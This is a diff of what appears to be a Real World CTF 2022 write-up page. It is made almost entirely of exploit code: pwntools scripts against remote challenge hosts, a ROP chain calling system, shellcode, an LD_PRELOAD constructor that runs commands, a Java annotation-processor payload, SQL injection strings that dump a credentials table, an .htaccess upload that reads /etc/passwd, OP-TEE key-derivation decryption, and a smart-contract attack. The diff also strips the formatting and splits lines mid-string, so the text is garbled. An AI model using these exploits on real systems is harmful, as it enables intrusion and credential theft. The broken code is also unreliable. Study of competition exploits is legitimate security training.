@@ -34,8 +34,8 @@ typedef enum {
 } VM_CODE;
 '''
 
-#p = process("./svme")
-#base = p.libs()["/media/psf/Home/Documents/2022-CTF/realworldctf-2022/pwn-SVME/svme_9495bfd34dcaea7af748f1138d5fc25e/svme"]
+    #p = process("./svme")
+    #base = p.libs()["/media/psf/Home/Documents/2022-CTF/realworldctf-2022/pwn-SVME/svme_9495bfd34dcaea7af748f1138d5fc25e/svme"]
 
 IP, PORT = "47.243.140.252", 1337
 p = remote(IP, PORT)
@@ -51,11 +51,11 @@ HALT = 18
 
 # debug mode
 cmd = ""
-#cmd = "b *%dn" %(base+0x137e) # loop
-#cmd += "b *%dn" %(base+0x1d58) # vm_exec
-#cmd = "set $a=0x5555555592a0n" # vm's address
-#cmd += "b *%dn" %(base+0x194C) # before exit
-#gdb.attach(p, cmd)
+    #cmd = "b *%dn" %(base+0x137e) # loop
+    #cmd += "b *%dn" %(base+0x1d58) # vm_exec
+    #cmd = "set $a=0x5555555592a0n" # vm's address
+    #cmd += "b *%dn" %(base+0x194C) # before exit
+    #gdb.attach(p, cmd)
 
 # payload opcode 
 code = p32(POP)*1
@@ -137,18 +137,13 @@ code = code.ljust(512, b"x00")
 p.send(code)
 
 p.interactive()
-```
-
-
-
-```
-#include<string.h>
-#include<fcntl.h>
-#include<unistd.h>
-#include<stdio.h>
-#include<stdlib.h>
-#include <stdint.h>
-#include <stdlib.h>
+    #include<string.h>
+    #include<fcntl.h>
+    #include
+    #include<stdio.h>
+    #include<stdlib.h>
+    #include <stdint.h>
+    #include <stdlib.h>
 
 int ql_open(char* abs_path, long flag){
         int fd,dir_fd;
@@ -196,11 +191,6 @@ int main(){
         close(fd);
 
 }
-```
-
-
-
-```
 from pwn import *
 
 debug = 0
@@ -245,11 +235,6 @@ test = b'Oclient_port' + b'a' * 1273 + p32(0x13fa1c)[:3] + b'rnbb' +�
 p.send(test)
 # p.sendline(test)
 p.interactive()
-```
-
-
-
-```
 # shellcode for open read write
 subi              sp, sp, 12
 st.w              r8, (sp, 0)
@@ -299,17 +284,12 @@ mov              r1, r3
 movi              r0, 4
 movi              r7, 64
 trap              0
-```
-
-
-
-```
 from code import interact
 from distutils.dir_util import copy_tree
 from re import sub
 from pwn import *
 import subprocess
-#context.log_level = 'debug'
+    #context.log_level = 'debug'
 context.arch='amd64'
 DEBUG = 0
 if(DEBUG):
@@ -385,7 +365,8 @@ def req(base,length):
                 res+=guess
                 flag=1
                 break
-            except:
+            
+except:
                 p.close()
                 continue
         if(not flag):
@@ -434,18 +415,14 @@ if __name__ == "__main__":
         ret,rdi,heap+0x100*2,system
     ])
     exploit(r)
-```
-
-
-
-```
 try:
             subprocess.run(
                 ["javac", "-cp", DEP_FILE, SOURCE_FILE],
                 input=b"",
                 check=True,
             )
-        except subprocess.CalledProcessError:
+        
+except subprocess.CalledProcessError:
             print("Failed to compile!")
             exit(1)
 
@@ -463,14 +440,10 @@ try:
                 ],
                 check=True,
             )
-        except subprocess.CalledProcessError:
+        
+except subprocess.CalledProcessError:
             print("Failed to run!")
             exit(2)
-```
-
-
-
-```
 import exp.Fuck;
 
 public class Main {
@@ -482,11 +455,6 @@ public class Main {
 
     }
 }
-```
-
-
-
-```
 package exp;
 
 import java.lang.annotation.ElementType;
@@ -498,11 +466,6 @@ import java.lang.annotation.Target;
 @Target(ElementType.FIELD)
 public @interface Fuck {
 }
-```
-
-
-
-```
 package exp;
 
 import java.io.File;
@@ -588,42 +551,13 @@ public class FuckProcessor implements Processor {
     }
     
 }
-```
-
-
-
-```
 exp.FuckProcessor
-```
-
-
-
-```
 // https://mvnrepository.com/artifact/com.google.auto.service/auto-service
-    implementation 'com.google.auto.service:auto-service:1.0.1'
-```
-
-
-
-```
+    implementation 'com.google.auto.service:
+auto-service:1.0.1'
 ';select tablename,schemaname from pg_tables where tablename like 'ta%' limit 1 offset 1;--
-```
-
-
-
-```
 ';SELECT column_name,1 FROM information_schema.columns WHERE table_name='target_credentials' limit 1 offset 0;--
-```
-
-
-
-```
 ';SELECT concat(id,account,password,access_key,secret_key),1 FROM target_credentials where  id ='1
-```
-
-
-
-```
 import requests,re
 
 session = requests.session()
@@ -631,31 +565,32 @@ session = requests.session()
 file_content="ErrorDocument 404 %{file:/etc/passwd}"
 filename=".htaccess"
 
-burp0_url = "http://47.243.75.225:31337/upload?formid=form-1e5eb93c-a7f4-4d16-9981-618e426c07dd"
-burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryS5VjK1pba1yEbdzT", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://47.243.75.225:31337/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7", "Connection": "close"}
+burp0_url = "http://47.243.75.225:
+31337/upload?formid=form-1e5eb93c-a7f4-4d16-9981-618e426c07dd"
+burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryS5VjK1pba1yEbdzT", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://47.243.75.225:
+31337/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7", "Connection": "close"}
 burp0_data = "------WebKitFormBoundaryS5VjK1pba1yEbdzTrnContent-Disposition: form-data; name="form-1e5eb93c-a7f4-4d16-9981-618e426c07dd"; filename="smity.txt"rnContent-Type: text/x-shrnrn"+file_content+"rn------WebKitFormBoundaryS5VjK1pba1yEbdzT--"
 r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)
 
-info = re.findall(r'http://47.243.75.225:31338/(.*?)/smity.txt',r.text)
+info = re.findall(r'http://47.243.75.225:
+31338/(.*?)/smity.txt',r.text)
 
 session = requests.session()
 
-burp0_url = "http://47.243.75.225:31337/upload?formid=b"
-burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryh0XsiM1LBiqUjsXU", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://192.168.1.25:8000/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7", "Connection": "close"}
+burp0_url = "http://47.243.75.225:
+31337/upload?formid=b"
+burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryh0XsiM1LBiqUjsXU", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://192.168.1.25:
+8000/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7", "Connection": "close"}
 burp0_data = "------WebKitFormBoundaryh0XsiM1LBiqUjsXUrnContent-Disposition: form-data; name="a"; filename="null"rnContent-Type: text/xmlrnrnabcrn------WebKitFormBoundaryh0XsiM1LBiqUjsXUrnContent-Disposition: form-data; name="b"; filename=""+filename+""rnContent-Type: text/xmlrnrn"+file_content+"rn------WebKitFormBoundaryh0XsiM1LBiqUjsXU--"
 r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)
 
-print('http://47.243.75.225:31338/'+info[0]+"/"+filename)
-```
+print('http://47.243.75.225:
+31338/'+info[0]+"/"+filename)
+    #define _GNU_SOURCE
 
-
-
-```
-#define _GNU_SOURCE
-
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <string.h>
 
 extern char** environ;
 
@@ -673,11 +608,6 @@ __attribute__ ((__constructor__)) void preload (void)
     }
     system(cmdline);
 }
-```
-
-
-
-```
 /*
  * File layout
  * [demo with input:
@@ -720,11 +650,6 @@ __attribute__ ((__constructor__)) void preload (void)
  * Note that nodes start counting at 1 while blocks at 0, this means that
  * block 0 is represented by node 1.
  */
-```
-
-
-
-```
 /* Internal struct provided to let the rpc callbacks know the size if needed */
 struct tee_fs_htree_image {
         uint8_t iv[TEE_FS_HTREE_IV_SIZE];
@@ -741,12 +666,7 @@ struct tee_fs_htree_node_image {
         uint8_t tag[TEE_FS_HTREE_TAG_SIZE];
         uint16_t flags;
 };
-```
-
-
-
-```
-#define TA_FRAMEWORK_STACK_SIZE 2048
+    #define TA_FRAMEWORK_STACK_SIZE 2048
 
 const struct ta_head ta_head __section(".ta_head") = {
     /* UUID, unique to each TA */
@@ -767,19 +687,14 @@ const struct ta_head ta_head __section(".ta_head") = {
      */
     .depr_entry = UINT64_MAX,
 };
-```
-
-
-
-```
 import os
 import struct
 from hashlib import sha256
-#from Crypto.Hash import HMAC, SHA256
+    #from Crypto.Hash import HMAC, SHA256
 from hmac import HMAC
 from Crypto.Cipher import AES
 import binascii
-#from Crypto.Util.Padding import unpad
+    #from Crypto.Util.Padding import unpad
 
 def AES_Encrypt_CBC(key, iv, data):
     #vi = '0102030405060708'
@@ -872,8 +787,8 @@ HUK = b'x00'*0x10
 chip_id = b'BEEF'*8
 static_string = b'ONLY_FOR_tee_fs_ssk'
 message = chip_id + static_string + b'x00'
-#message = b'x01x00x00x00'
-#message = static_string
+    #message = b'x01x00x00x00'
+    #message = static_string
 
 #SSK = HMAC(HUK, chip_id, digestmod=sha256)
 #SSK.update(static_string)
@@ -883,9 +798,9 @@ SSK = HMAC(HUK, message, digestmod=sha256).digest()
 print ("SSK: " + bytesToHexString(SSK))
 
 ta_uuid =  b'xbbx50xe7xf4x37x14xbfx4fx87x85x8dx35x80xc3x49x94'
-#ta_uuid = b"xF4xE7x50xBBx14x37x4FxBFx87x85x8Dx35x80xC3x49x94"
-#ta_uuid = b"xb6x89xf2xa7x8axdfx47x7ax9fx99x32xe9x0cx0axd0xa2"
-#ta_uuid = b"xb6x89xf2xa7"[::-1] + b"x8axdf"[::-1] + b"x47x7a"[::-1] + b"x9fx99x32xe9x0cx0axd0xa2"
+    #ta_uuid = b"xF4xE7x50xBBx14x37x4FxBFx87x85x8Dx35x80xC3x49x94"
+    #ta_uuid = b"xb6x89xf2xa7x8axdfx47x7ax9fx99x32xe9x0cx0axd0xa2"
+    #ta_uuid = b"xb6x89xf2xa7"[::-1] + b"x8axdf"[::-1] + b"x47x7a"[::-1] + b"x9fx99x32xe9x0cx0axd0xa2"
 TSK = HMAC(SSK, ta_uuid, digestmod=sha256).digest()
 print ("TSK: " + bytesToHexString(TSK))
 
@@ -894,7 +809,7 @@ Enc_FEK = Tee_fs_htree_image_1_enc_fek
 FEK = AES_Decrypt_ECB(TSK, Enc_FEK)
 print ("FEK: " + bytesToHexString(FEK))
 
-#test()
+    #test()
 
 """
 print ("........ decrypt meta data ...........")
@@ -908,8 +823,10 @@ print (plaintext)
 """
 
 print ("........ decrypt block data ...........")
-block_0 = data[0x2000:0x3000]
-#block_1 = data[0x3000:0x4000]
+block_0 = data[0x2000:
+0x3000]
+    #block_1 = data[0x3000:
+0x4000]
 
 cipher = AES.new(FEK, AES.MODE_GCM, nonce = Tee_fs_htree_node_image_1_iv)
 
@@ -918,16 +835,12 @@ cipher.update(Tee_fs_htree_node_image_1_iv)
 
 plaintext = cipher.decrypt_and_verify(block_0, Tee_fs_htree_node_image_1_tag)
 print (plaintext)
-```
-
-
-
-```
 from web3 import Web3,HTTPProvider
 from typing import Tuple, List
 from web3 import Web3
 import bisect
-w3=Web3(HTTPProvider('http://47.243.235.111:8545'))
+w3=Web3(HTTPProvider('http://47.243.235.111:
+8545'))
 
 abi="""[
     {
@@ -1334,11 +1247,6 @@ openTreasureChest_txn = contract.functions.openTreasureChest().buildTransactio
 signed = acct.signTransaction(openTreasureChest_txn)
 tx_id = w3.eth.sendRawTransaction(signed.rawTransaction) 
 print(tx_id.hex())
-```
-
-
-
-```
 rwctf{Super_Hunters_Conquer_Together}
 ```
 
